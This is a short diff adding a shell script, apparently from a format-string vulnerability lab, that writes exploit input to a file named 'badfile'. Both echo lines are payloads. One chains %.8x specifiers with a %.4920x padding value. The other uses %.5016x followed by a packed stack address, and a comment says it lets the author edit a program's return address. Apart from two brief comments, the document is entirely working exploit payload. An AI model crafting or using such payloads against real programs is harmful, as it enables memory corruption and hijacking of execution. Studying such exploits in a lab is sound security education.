@@ -1,0 +1,5 @@
+# return same address
+echo "%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.4920x" > badfile
+
+# found that when append %.5016x, we can edit the value of the return address
+echo "%.5016x$(printf "\x20\xd2\xff\xff")" > badfile
